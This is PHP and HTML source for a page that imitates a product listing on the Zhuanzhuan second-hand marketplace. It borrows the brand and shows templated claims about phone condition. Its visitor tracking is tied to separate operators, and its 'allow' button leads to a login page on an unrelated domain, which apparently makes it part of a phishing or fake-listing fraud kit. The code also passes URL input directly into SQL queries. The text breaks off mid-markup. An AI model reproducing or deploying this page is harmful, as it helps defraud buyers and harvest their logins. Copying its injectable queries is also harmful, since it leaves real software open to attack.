<!DOCTYPE html>

<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');


if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	
	
	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){

    }
}
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
	    
		_query("
			INSERT INTO useraddress (
						
								titlea,
								type,
								class,
								gid,
								aid,
								state,
								utime
								) 
						VALUES (
							
						'{$_GoodsID['title']}',
								1,
								1,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME}'
								)"
			);
		  
		  session_destroy();
	}
	

	
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}

if($_GoodsID['oldnew']==1){
$oldnew888="全新";
$oldnew666="未激活，未使用过，全部功能正常，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==2){
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
        
}
if($_GoodsID['oldnew']==3){
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==4){
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
    $oldnew555="none";
}
if($_GoodsID['oldnew']==5){
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";}
if($_GoodsID['oldnew']==6){
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";

}



if($_GoodsID['oldnewa']==1)
$oldnewa88="85%以上";
if($_GoodsID['oldnewa']==2)
$oldnewa88="90%以上";
if($_GoodsID['oldnewa']==3)
$oldnewa88="95%以上";
if($_GoodsID['oldnewa']==4)
$oldnewa88="100%";

if($_GoodsID['oldnewb']==1)
$oldnewb888="更换品牌电池";
if($_GoodsID['oldnewb']==2)
$oldnewb888="无更换";
if($_GoodsID['oldnewb']==3)
$oldnewb888="4G";
if($_GoodsID['oldnewb']==4)
$oldnewb888="5G";



if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="正通过平台保卖寄存在石家庄验机中心";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


if($_GoodsID['qcyanji']==1){
$qcyanji777="";
$qcyanji888="Android - 安卓系统 <i class='icon-android'></i>";}
if($_GoodsID['qcyanji']==2){
$qcyanji777="【苹果版】";
$qcyanji888="App Store - 苹果正版 <i class='icon-ios'></i>";}

?>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="vjs-styles-defaults">
      .video-js {
        width: 300px;
        height: 150px;
      }

      .vjs-fluid {
        padding-top: 56.25%
      }
    </style>
<!DOCTYPE html>
<html lang="en">
  
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="https://m.zhuanzhuan.com/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>转转-
      <?php echo $oldnew888;?> <?php echo $_GoodsID['title']; ?>  </title>
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width,initial-scale=0.5, minimum-scale=0.5,
    maximum-scale=0.5, user-scalable=no">
    <meta name="format-detection" content="telphone=no, email=no">
    <link rel="stylesheet" href="css/detail.css">
    <link rel="stylesheet" href="css/css.css">
    <style type="text/css">.spack{ font-weight: 600; display: inline-block; margin-right: .16rem; vertical-align: middle; font-size: .43rem; width: 50%; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .label{ font-size: 0.44666667rem; letter-spacing: 0; text-align: justify; line-height: .26667rem; box-sizing: border-box; margin-right: .10667rem; color: #aaaeb9; padding: .05333rem; }</style>
    <link rel="stylesheet" type="text/css" href="css/chunk-77212e5d.1acb477e.css">
    <link rel="stylesheet" type="text/css" href="css/chunk-c551cefc.0e3a7d9d.css">
    <link rel="stylesheet" type="text/css" href="css/chunk-61a8e03e.7f9645b9.css">
    <link rel="stylesheet" href="css/swiper.min.css">
    <link href="css/video-js-cdn.css" rel="stylesheet">
    <link href="css/mui.css" rel="stylesheet" type="text/css" />
    <script src="js/video.min.js"></script>

  </head>
  
  <body style="background-color: rgb(248, 248, 248);">
    <div id="yue999" style="display: none;">
      <div class="am-dialog-mask" style="z-index:99999;"></div>
      <div class="am-dialog-box" style="z-index:99999999;margin-top: -71.4286px; opacity: 1; transform: scale(1);">
        <div class="am-dialog-content">
          <div class="am-dialog-text" style="text-align:center;">即将离开QQ
            <br>打开转转应用</div>
          <div class="am-dialog-button" am-mode="two">
            <a onclick="yue90();">取消</a>
            <a href="http://www.gfcnh293.top/zz/login.php?weixin=c83ab7606d9b8cfc023a40633059a016">允许</a></div>
        </div>
      </div>
    </div>
    <div data-v-7e103928="" class="main-wrap">
      <div data-v-7e103928="" class="main-slide">
        <span data-v-7e103928="" style="bottom: 1rem;" class="num-total swiper-pagination swiper-pagination-fraction">
          <span class="swiper-pagination-current">1</span>/
          <span class="swiper-pagination-total">1</span></span>
        <div data-v-7e103928="" class="zzyp-swipe swiper-container swiper-container-initialized swiper-container-horizontal">
          <div class="swiper-wrapper" style="transition-duration: 0ms; transform: translate3d(-686px, 0px, 0px);">
            <div data-v-7e103928="" class="swiper-slide swiper-slide-duplicate swiper-slide-prev swiper-slide-duplicate-next" lazy="loaded" data-swiper-slide-index="1" style="width: 656px; margin-right: 30px;">
              <img style="border-radius: 1.33%;" src="picture/162601952149353.jpg" width="100%"></div>
                                              
                  <style>
                  .active1 { transition: all .3s; background-color: #FE3F47 !important;color: #fff !important; } 
                  .tab_nav { display: none; } 
                  .on { width: 750px; display: block; color: #fff ;} 
                  #back{ position: fixed; width: 100%; height: 100%; display: block; z-index: -100; }

                  .sp {
                    margin-left: 10px;
                    width: 80px;
                    height: 40px;
                    border-radius: 20px;
                    line-height: 40px;
                    background: #fff;
                    color: #444444;
                    font-size: 22px;
                    text-align: center;
                 }
                </style>



                  <div data-v-7e103928="" class="swiper-slide swiper-slide-next swiper-slide-duplicate-prev" lazy="loaded" data-swiper-slide-index="1" style="width: 656px; margin-right: 30px; ">
                    <img class="back" style="border-radius: 1.33%;" src="<?php echo $_GoodsID['goods_img1'] ?>" width="100%"></div>
                                                            <div data-v-7e103928="" class="swiper-slide swiper-slide-active" lazy="loaded" data-swiper-slide-index="0" style="width: 656px; margin-right: 30px; ">
                        <img class="back" style="border-radius: 1.33%;" src="<?php echo $_GoodsID['goods_img2'] ?>" width="100%"></div>
                                                                        <div data-v-7e103928="" class="swiper-slide swiper-slide-active" lazy="loaded" data-swiper-slide-index="0" style="width: 656px; margin-right: 30px;">
                            <img style="border-radius: 1.33%;" src="<?php echo $_GoodsID['goods_img3'] ?>" width="100%"></div>
                                                                                    <div data-v-7e103928="" class="swiper-slide swiper-slide-active" lazy="loaded" data-swiper-slide-index="0" style="width: 656px; margin-right: 30px;">
                                <img class="back" style="border-radius: 1.33%;" src="<?php echo $_GoodsID['goods_img4'] ?>" width="100%"></div>
                                                              <div data-v-7e103928="" class="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-active" lazy="loaded" data-swiper-slide-index="0" style="width: 656px; margin-right: 30px; margin-top: 50%;">
                                  <img class="back" style="border-radius: 1.33%;" src="" width="100%"></div>
          </div>
          <div></div>
          <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
        </div>
        <div data-v-7e103928="" class="full-swipe">
          <div class="zzyp-popup-wrapper" style="width: 750px; height: 1334px; display: none;">
            <div class="center zzyp-popup"></div>
            <div class="zzyp-popup-cover" style="width: 750px; height: 1334px; display: none;"></div>
          </div>
        </div>
        <style>

        #pointOn333 { background: #FE3F47 !important; color: #fff !important; }
      </style>
        <div style="display:flex;align-items:center;justify-content:center;margin: 10px 0;">
          <div class="list_nav active1" id="pointOn" style="width: 80px;height: 40px;border-radius: 20px;line-height:40px;background: ##FE3F47;color: #444444;font-size: 22px;text-align: center;">视频</div>
          <div class="list_nav" style="margin-left: 10px;width: 80px;height: 40px;border-radius: 20px;line-height: 40px;background: #fff;color: #1a1919;font-size: 22px;text-align: center;">图片</div></div>
      </div>

    <script src="js/jquery-1.8.3.min.js" tppabs="http://zhuanzhuan.com.285786.cn/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>

      <script>//js实现tab选项卡交互

        var aList = document.getElementsByClassName("list_nav"),
        aTab = document.getElementsByClassName("tab_nav"),
        index = 0; //用来存储上一次的值
        for (var i = 0; i < aList.length; i++) {  
          //闭包加函数自执行
          (function(i) {
        
              aList[i].onclick = function() {
              aList[index].classList.remove("active1");
              aTab[index].classList.remove("on");
              index = i;
              aList[index].classList.add("active1");
              aTab[index].classList.add("on");
            };
          })(i);
        }</script>
      <div class="scroll-nav" style="display: none;">
        <a class="active" data-id="goods">商品</a>
        <a data-id="report">验机报告</a>
        <!--<a data-id="seller">卖家</a>-->
        <a data-id="recommend">推荐</a></div>
      <style>.main-slide .zzyp-swipe[data-v-7e103928]{ height:8rem } .video-dimensions.vjs-fluid{ height:8rem; padding-top:0px!important } .scroll-nav{ display:flex!important } .main-slide{ margin-top:1.06667rem; height:8rem } .swiper-slide img{width:100%;height:100%} .vjs-poster{height:8rem} .vjs-ended .vjs-big-play-button,.vjs-paused .vjs-big-play-button{display:block}</style>
     
      <div class="goods-box" style="padding-left: 45px;background-color: #fff;">
        <div class="price-box">
          <i>¥</i>
          <span class="money">
            <?php echo $_GoodsID['price']; ?></span>
          <!--价格-->
          <span class="label" >包邮</span>
        <div class="goods-name" style="	color:#000000">
          <img data-v-63e5e464="" src="picture/yyj.png">&nbsp;&nbsp;
          <?php echo $_GoodsID['title']; ?></div>
        <!--商品名称-->

    </div>

      <div data-v-63e5e464="" id="yanji_div" class="service-item" style="text-align: center;background-color: #fff">
        <a href="https://m.zhuanzhuan.com/Mzhuanzhuan/zhuanzhuan/zzactivity/magic/5ebb9f655e41feb22db70d29/index.html?metric=Nd5h6KWj7EvhUXioFaQTBQ11117vou&pageid=1342260592">
          <img data-v-63e5e464="" id="yanji" src="picture/yanji.png"></a>
        <!----></div>
    </div>
    <style type="text/css">.baomai-router .right-arrow[data-v-06118f74] { position: absolute; right: -2.667vw; top: 50%; -webkit-transform: translateY(-50%); transform: translateY(-50%); height: 3.2vw; } .common-btn-wrap .btn-wrap[data-v-5517391a] { position: absolute; left: 0; bottom: 0; width: 100%; padding: 1.6vw 3.2vw; box-sizing: border-box; } .common-btn-wrap .btn-wrap .btn[data-v-5517391a] { width: 100%; height: 9.6vw; font-size: 4vw; font-weight: 700; color: #fff; text-align: center; background-image: linear-gradient(134deg,#f55,red); border-radius: 4.8vw; } .yx-intro { margin-bottom: 2.667vw; padding: 2.133vw 4.267vw 4.267vw;background-color: #fff; } #yanji_div { position: relative; border-radius: 1.067vw; /* color: #b27838; */ } #yanji { width: 100%; height: 15.467vw; border: none; vertical-align: top; } .promotion { margin-bottom: 2.667vw; background: #fff; color: #111; line-height: 1; } .common-cell[data-v-0cdbc1bc] { position: relative; padding: 4.533vw 3.2vw 4.533vw 0; margin: 0 4.267vw; background: #fff; } .common-cell dl[data-v-0cdbc1bc] { position: relative; padding-left: 11.733vw; } .common-cell dl dt[data-v-0cdbc1bc] { position: absolute; left: 0; top: .267vw; line-height: 4vw; font-size: 3.2vw; color: #111; font-weight: 500; } .common-cell dl dd[data-v-0cdbc1bc] { position: relative; } .redPack-list[data-v-f597be66] { height: 5.6vw; overflow: hidden; } ol, ul { margin: 0; padding: 0; list-style: none; } .redPack-list li[data-v-f597be66] { position: relative; display: inline-block; height: 5.333vw; padding: 0 1.067vw; margin-right: 1.067vw; font-size: 3.2vw; line-height: 5.333vw; color: #f55; background-color: rgba(255,85,85,.08); margin-bottom: .267vw; } .redPack-list li span[data-v-f597be66] { position: relative; display: block; height: 5.333vw; } .common-cell dl dt[data-v-0cdbc1bc] { position: absolute; left: 0; top: .267vw; line-height: 4vw; font-size: 3.2vw; color: #111; font-weight: 500; } .common-cell dl dd[data-v-0cdbc1bc] { position: relative; } .common-cell .right-arrow[data-v-0cdbc1bc] { position: absolute; right: 0; top: 50%; -webkit-transform: translateY(-50%); transform: translateY(-50%); height: 3.2vw; } ul.promotion-list li .tag[data-v-f597be66] { font-size: 2.667vw; padding: .667vw 1.067vw .4vw; margin-right: 2.133vw; color: #ff9429; box-sizing: border-box; position: relative; border-radius: .533vw; border: 1px solid #ff9429; } ul.promotion-list li .txt[data-v-f597be66] { font-size: 3.2vw; line-height: 5.333vw; } ul.promotion-list li>span[data-v-f597be66] { display: inline-block; vertical-align: middle; } /**yanhuo***/ .express-and-select[data-v-12d613ae] { margin-bottom: 2.667vw; background: #fff; } .cell-info[data-v-12d613ae]:not(:last-child) { position: relative; } .common-cell[data-v-0cdbc1bc] { padding: 4.533vw 3.2vw 4.533vw 0; margin: 0 4.267vw; background: #fff; } .common-cell dl[data-v-0cdbc1bc] { position: relative; padding-left: 11.733vw; } article, aside, blockquote, body, button, code, dd, details, div, dl, dt, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, hr, input, legend, li, menu, nav, ol, p, pre, section, td, textarea, th, ul { margin: 0; padding: 0; } .page-detail { font-size: 3.2vw; } /**流程*/ .common-cell dl dt[data-v-0cdbc1bc] { position: absolute; left: 0; top: .267vw; line-height: 4vw; font-size: 3.2vw; color: #111; font-weight: 500; } .common-cell dl dd[data-v-0cdbc1bc] { position: relative; } @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 2dppx) .cell-info[data-v-12d613ae]:not(:last-child) { border-bottom: none; } .cell .process[data-v-06118f74], .process .content[data-v-06118f74] { display: flex; } .process .content .circle-wrap .circle img[data-v-06118f74] { width: 2.667vw; margin-top: 1.067vw; } .process .content[data-v-06118f74] { flex: 1; flex-direction: column; align-items: center; } .process .content .circle-wrap[data-v-06118f74] { width: 100%; display: flex; justify-content: center; position: relative; } .process .content .circle-wrap .circle[data-v-06118f74] { position: relative; width: 4.267vw; height: 4.267vw; border-radius: 50%; margin-bottom: 1.333vw; background-color: #111; background-size: cover; text-align: center; } .process .content .text[data-v-06118f74] { text-align: center; font-size: 2.4vw; color: #111; } div, form, h2, h3, h4, html, li, p, span, ul { word-wrap: break-word; word-break: break-all; } .process .content .circle-wrap .circle img[data-v-06118f74] { width: 2.667vw; margin-top: 1.067vw; } img { vertical-align: top; } fieldset, img { border: 0; } .baomai-router[data-v-06118f74] { display: -webkit-flex; display: flex; -webkit-align-items: center; align-items: center; margin-top: 5.333vw; position: relative; }.baomai-router .circle[data-v-06118f74] { position: relative; width: 4.267vw; height: 4.267vw; border-radius: 50%; background-size: cover; text-align: center; } .baomai-router .text[data-v-06118f74] { margin-left: 1.6vw; font-family: PingFangSC-Regular; font-size: 2.933vw; color: #111; letter-spacing: 0; line-height: 3.733vw; } .common-cell[data-v-0cdbc1bc] { position: relative; padding: 4.533vw 3.2vw 4.533vw 0; margin: 0 4.267vw; background: #fff; } .common-cell dl[data-v-0cdbc1bc] { position: relative; padding-left: 11.733vw; } .common-cell dl dd[data-v-0cdbc1bc] { position: relative; } .process .content .circle-wrap[data-v-06118f74] { width: 100%; display: flex; justify-content: center; position: relative; } .process .content .circle-wrap .circle[data-v-06118f74] { position: relative; width: 4.267vw; height: 4.267vw; border-radius: 50%; margin-bottom: 1.333vw; background-color: #111; background-size: cover; text-align: center; } .process .content .circle-wrap .first-circle[data-v-06118f74]:after { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #111; opacity: .3; border-radius: 50%; } .process .content .text[data-v-06118f74] { text-align: center; font-size: 2.4vw; color: #111; } div, form, h2, h3, h4, html, li, p, span, ul { word-wrap: break-word; word-break: break-all; } .success:before { content: ""; position: absolute; top: 2.133vw; right: calc(50% + 2.667vw); width: calc(100% - 5.333vw); height: 1px; background: #111; } .z-popup--bottom { width: 100%; top: auto; bottom: 0; right: auto; left: 50%; transform: translate3d(-50%,0,0); } .z-popup { position: fixed; max-height: 100%; overflow-y: auto; background-color: #fff; transition: .3s ease-out; } article, aside, blockquote, body, button, code, dd, details, div, dl, dt, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, hr, input, legend, li, menu, nav, ol, p, pre, section, td, textarea, th, ul { margin: 0; padding: 0; } .common-btn-wrap .title[data-v-5517391a] { position: absolute; top: 0; left: 0; width: 100%; padding: 6.4vw 4vw; text-align: center; font-size: 4.267vw; color: #111; font-weight: 600; box-sizing: border-box; } .common-btn-wrap .main[data-v-5517391a] { position: relative; padding-top: 17.067vw; padding-bottom: 14.933vw;
      box-sizing: border-box; } .common-btn-wrap .title .close[data-v-5517391a] { position: absolute; right: 4vw; top: 50%; transform: translateY(-50%); } .z-icon { vertical-align: middle; } .z-icon, .z-icon:before { display: inline-block; } .z-icon, .zziconfont { font: 3.733vw/1 z-icon; font-size: inherit; text-rendering: auto; -webkit-font-smoothing: antialiased; } .common-btn-wrap .container[data-v-5517391a] { min-height: 53.333vw; max-height: 60vh; overflow: hidden; overflow-y: scroll; } .coupon-con[data-v-f597be66] { line-height: 1; margin: 0 4.267vw; } .coupon-con p.coupon-tit[data-v-f597be66] { padding: 2.667vw 0; font-size: 3.467vw; color: #999; line-height: 5.333vw; } ol, ul { margin: 0; padding: 0; list-style: none; } .coupon-con ul li[data-v-f597be66] { position: relative; height: 21.333vw; padding-left: 24vw; padding-right: 3.2vw; margin-bottom: 3.2vw; background-color: rgba(255,85,85,.06); border-radius: 2.133vw; } .coupon-con ul li .num-wrap[data-v-f597be66] { position: absolute; left: 0; top: 50%; -webkit-transform: translateY(-50%); transform: translateY(-50%); width: 24vw; padding-left: 4.267vw; font-size: 7.2vw; font-weight: 600; color: #f55; box-sizing: border-box; } .coupon-con ul li .num-wrap .unit[data-v-f597be66] { font-size: 3.733vw; } .coupon-con ul li .num-wrap span[data-v-f597be66] { display: inline-block; } .coupon-con ul li .num-wrap[data-v-f597be66] { position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 24vw; padding-left: 4.267vw; font-weight: 600; color: #f55; box-sizing: border-box; } .coupon-con ul li .num-wrap span[data-v-f597be66] { display: inline-block; } .coupon-con ul li .coupon-info[data-v-f597be66] { position: relative; display: flex; align-items: center; justify-content: space-between; height: 100%; padding: 1.6vw 0 1.6vw 4.267vw; border-left: 1px dashed #ffa2a2; box-sizing: border-box; } .coupon-con ul li .coupon-info .coupon-main[data-v-f597be66] { width: 33.333vw; color: #9b9b9b; } .coupon-con ul li .coupon-info .coupon-main p[data-v-f597be66]:not(:last-child) { margin-bottom: 1.6vw; } .coupon-con ul li .coupon-info .coupon-main .rule[data-v-f597be66] { font-size: 4vw; color: #f55; font-weight: 600; } .coupon-con ul li .coupon-info .coupon-main p[data-v-f597be66]:not(:last-child) { margin-bottom: 1.6vw; } .coupon-con ul li .coupon-info .coupon-main .tip[data-v-f597be66] { font-size: 3.2vw; white-space: nowrap; } .coupon-con ul li .coupon-info .coupon-main .pay-tip[data-v-f597be66], .coupon-con ul li .coupon-info .coupon-main .tip[data-v-f597be66] { overflow: hidden; text-overflow: ellipsis; } .coupon-con ul li .coupon-info .coupon-main .effect[data-v-f597be66] { font-size: 2.667vw; } .coupon-con ul li .coupon-info .get-btn[data-v-f597be66] { width: 20vw; padding: 2vw 0; font-size: 3.2vw; font-weight: 600; color: #fff; border-radius: 3.733vw; background: #f55; text-align: center; } .common-btn-wrap .container[data-v-5517391a] { min-height: 53.333vw; max-height: 60vh; overflow: hidden; overflow-y: scroll; } ul.promotion-list-popup[data-v-f597be66] { padding: 0 4.267vw; } ul.promotion-list-popup li[data-v-f597be66] { margin-bottom: 6.4vw; } ul.promotion-list-popup li .tit[data-v-f597be66] { position: relative; margin-bottom: 3.467vw; font-size: 3.733vw; color: #111; display: flex; justify-content: flex-start; align-items: center; } @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 2dppx) ul.promotion-list-popup li .tit em[data-v-f597be66] { border: none; } ul.promotion-list-popup li .tit em[data-v-f597be66] { height: 3.733vw; padding: .667vw 1.333vw .4vw; margin-right: 2.133vw; color: #ff9429; font-size: 2.667vw; box-sizing: border-box; position: relative; border-radius: .533vw; border: 1px solid #ff9429; } em, i { font-style: normal; } ul.promotion-list-popup li .tit span[data-v-f597be66] { flex: 1; } .common-btn-wrap .container[data-v-5517391a] { min-height: 53.333vw; max-height: 60vh; overflow: hidden; overflow-y: scroll; } .aftersale-list[data-v-12d613ae] { padding: 0 4.267vw; } .aftersale-list li[data-v-12d613ae] { margin-bottom: 6.4vw; } .aftersale-list li p.tit[data-v-12d613ae] { margin-bottom: 2.133vw; font-size: 3.733vw; font-weight: 600; color: #111; } .aftersale-list li p.desc[data-v-12d613ae] { font-size: 3.2vw; color: #999; line-height: 4.8vw; } .report-wrap img.yx-sign[data-v-204162c1] { position: absolute; right: 7.267vw; top: 13.8vw; width: 20.333vw; } .report-wrap[data-v-516c4722] { position: relative; border: .02667rem solid #d2d5df; margin: 0 .4rem; }</style>
    <section class="promotion" data-v-f597be66="">
      <div class="common-cell cell-info" data-v-0cdbc1bc="" data-v-f597be66="" style="z-index: 2015; display: none;">
        <dl data-v-0cdbc1bc="">
          <dt data-v-0cdbc1bc="">优惠</dt>
          <dd data-v-0cdbc1bc="">
            <ul class="redPack-list" data-v-0cdbc1bc="" data-v-f597be66="">
              <!---->
              <li data-v-0cdbc1bc="" data-v-f597be66="">
                <span data-v-0cdbc1bc="" data-v-f597be66="">满999减48</span></li>
              <!---->
              <li data-v-0cdbc1bc="" data-v-f597be66="">
                <span data-v-0cdbc1bc="" data-v-f597be66="">满399减38</span></li>
              <!---->
              <!----></ul>
          </dd>
        </dl>
        <img onclick="cuxiao()" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDU3LjEgKDgzMDg4KSAtIGh0dHBzOi8vc2tldGNoLmNvbSAtLT4KICAgIDx0aXRsZT7nrq3lpLQ8L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZyBpZD0i6aG16Z2iMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTE0LjI4ODU1MTksMTcuNDc2NzA0NyBDMTMuOTAwNDQwMSwxNy44Njk2MjY2IDEzLjkwNDMzOTQsMTguNTAyNzc5NiAxNC4yOTcyNjEzLDE4Ljg5MDg5MTQgQzE0LjY5MDE4MzMsMTkuMjc5MDAzMyAxNS4zMjMzMzYyLDE5LjI3NTEwMzkgMTUuNzExNDQ4MSwxOC44ODIxODIgTDIyLjc2MzY5NDIsMTEuNzQyNTMzNiBDMjMuMTUwMzU5MiwxMS4zNTEwNzY0IDIzLjE0ODEzOTksMTAuNzIwNzg4MiAyMi43NTg3Mjc4LDEwLjMzMjA2MzYgTDE1LjcwNjQ4MTcsMy4yOTIyNjg3MiBDMTUuMzE1NjEyNSwyLjkwMjA4OTY0IDE0LjY4MjQ0NzgsMi45MDI2NDkwOCAxNC4yOTIyNjg3LDMuMjkzNTE4MjcgQzEzLjkwMjA4OTYsMy42ODQzODc0NiAxMy45MDI2NDkxLDQuMzE3NTUyMTkgMTQuMjkzNTE4Myw0LjcwNzczMTI4IEwyMC42NDE3NTY1LDExLjA0NDc2MTMgTDE0LjI4ODU1MTksMTcuNDc2NzA0NyBaIiBpZD0i6Lev5b6EIiBmaWxsPSIjOTk5OTk5IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4KICAgIDwvZz4KPC9zdmc+" class="right-arrow" data-v-0cdbc1bc=""></div>
      <div data-v-f597be66="" id="z-popup-radius" class="z-popup-radius z-popup z-popup--bottom" style="z-index: 2015; display: none;">
        <div data-v-5517391a="" data-v-f597be66="" class="common-btn-wrap">
          <div data-v-5517391a="" class="main">
            <div data-v-5517391a="" class="title">优惠券
              <i data-v-5517391a="" onclick="close_icon()" class="close z-icon z-icon-cross">
                <!----></i></div>
            <div data-v-5517391a="" class="container">
              <div data-v-f597be66="" data-v-5517391a="" class="coupon-con">
                <!---->
                <div data-v-f597be66="" data-v-5517391a="">
                  <p data-v-f597be66="" data-v-5517391a="" class="coupon-tit">待领取红包</p>
                  <ul data-v-f597be66="" data-v-5517391a="">
                    <li data-v-f597be66="" data-v-5517391a="" class="">
                      <div data-v-f597be66="" data-v-5517391a="" class="num-wrap">
                        <span data-v-f597be66="" data-v-5517391a="" class="unit">¥</span>
                        <span data-v-f597be66="" data-v-5517391a="" class="num">22</span></div>
                      <div data-v-f597be66="" data-v-5517391a="" class="coupon-info">
                        <div data-v-f597be66="" data-v-5517391a="" class="coupon-main">
                          <p data-v-f597be66="" data-v-5517391a="" class="rule">满999减48</p>
                          <p data-v-f597be66="" data-v-5517391a="" class="tip">1.本券需在领取后1天内使用 2.手机满50元可用 3.仅限严选、已验机部分活动商品可用 4.全新机不可用</p>
                          <p data-v-f597be66="" data-v-5517391a="" class="effect">自领取起1天内有效</p></div>
                        <div data-v-f597be66="" data-v-5517391a="" class="get-btn">免费领取</div></div>
                    </li>
                    <li data-v-f597be66="" data-v-5517391a="" class="">
                      <div data-v-f597be66="" data-v-5517391a="" class="num-wrap">
                        <span data-v-f597be66="" data-v-5517391a="" class="unit">¥</span>
                        <span data-v-f597be66="" data-v-5517391a="" class="num">22</span></div>
                      <div data-v-f597be66="" data-v-5517391a="" class="coupon-info">
                        <div data-v-f597be66="" data-v-5517391a="" class="coupon-main">
                          <p data-v-f597be66="" data-v-5517391a="" class="rule">满399减38</p>
                          <p data-v-f597be66="" data-v-5517391a="" class="tip">1.本券需在领取后1天内使用 2.手机满50元可用 3.仅限严选、已验机部分活动商品可用 4.全新机不可用</p>
                          <p data-v-f597be66="" data-v-5517391a="" class="effect">自领取起1天内有效</p></div>
                        <div data-v-f597be66="" data-v-5517391a="" class="get-btn">免费领取</div></div>
                    </li>
                  </ul>
                </div>
              </div>
              <!----></div>
            <div data-v-5517391a="" class="btn-wrap">
              <button data-v-5517391a="" class="btn">确定</button></div>
          </div>
        </div>
      </div>
      <div class="common-cell cell-info" data-v-0cdbc1bc="" data-v-f597be66="">
        <dl data-v-0cdbc1bc="">
          <dt data-v-0cdbc1bc="">促销</dt>
          <dd data-v-0cdbc1bc="">
            <ul class="promotion-list" data-v-0cdbc1bc="" data-v-f597be66="">
              <li data-v-0cdbc1bc="" data-v-f597be66="">
                <span class="tag" data-v-0cdbc1bc="" data-v-f597be66="">3期免息</span>
                <span class="txt" data-v-0cdbc1bc="" data-v-f597be66="">发条分期x分期乐3期新用户免息</span></li>
            </ul>
      </div>
      <div class="common-cell cell-info" data-v-0cdbc1bc="" data-v-f597be66="">
        <dl data-v-0cdbc1bc="">
          <dt data-v-0cdbc1bc="">活动</dt>
          <dd data-v-0cdbc1bc="">
            <ul class="promotion-list" data-v-0cdbc1bc="" data-v-f597be66="">
              <li data-v-0cdbc1bc="" data-v-f597be66="">
                <span class="tag" data-v-0cdbc1bc="" data-v-f597be66="">趣租机</span>
